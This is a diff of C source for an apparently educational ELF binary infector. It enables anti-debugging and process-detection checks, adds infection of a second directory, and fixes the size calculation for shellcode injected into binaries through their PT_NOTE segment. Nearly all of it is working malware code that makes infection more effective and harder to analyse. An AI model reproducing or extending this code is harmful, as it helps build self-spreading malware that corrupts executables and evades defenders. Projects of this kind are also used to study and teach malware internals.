@@ -8,24 +8,25 @@ int   entry_point(void *magic) {
   char    infectDir2[] = "/tmp/test2";
   char    procName[] = "/proc/";
 
-  /* if (checkProcess(procName) != 0) */
-  /*   return (stop(1, magic)); */
-  /* if (preventDebug() == -1) */
-  /*   return (stop(1, magic)); */
+  if (checkProcess(procName) != 0)
+    return (stop(1, magic));
+  if (preventDebug() == -1)
+    return (stop(1, magic));
   if (magic != (void *)0x42)
     if (unObfuscate() == -1)
       return (stop(1, magic));
   if (infectBins(infectDir) == -1)
     return (stop(1, magic));
-  /* if (infectBins(infectDir2) == -1) */
-  /*   return (1); */
+  if (infectBins(infectDir2) == -1)
+    return (stop(1, magic));
   return (stop(0, magic));
 }
 
 static int   stop(int status, void *magic) {
+  register size_t rsp asm("rsp");
+
   if (magic == (void *)0x42)
     return (status);
-  register size_t rsp asm("rsp");
   asm("leave\n\t"
       "leave");
   // TODO Find why there is still 16 bytes on stack
@@ -617,17 +618,17 @@ static int  appendShellcode(struct bfile *bin) {
   munmap(bin->header, bin->size);
   bin->header = new.header;
   bin->size = new.size;
-  return (0);
+  return (sizeof(ins));
 }
 
 static int  appendCode(struct bfile *bin) {
+  int         ins;
   size_t      size;
   Elf64_Phdr  *segment;
 
-  if (appendShellcode(bin) == -1)
+  if ((ins = appendShellcode(bin)) == -1)
     return (-1);
-  // TODO 9 = sizeof(ins)
-  size = end - start + 9;
+  size = end - start + ins;
   segment = ((void *)bin->header) + bin->header->e_phoff;
   while (segment->p_type != PT_NOTE)
     segment += 1;
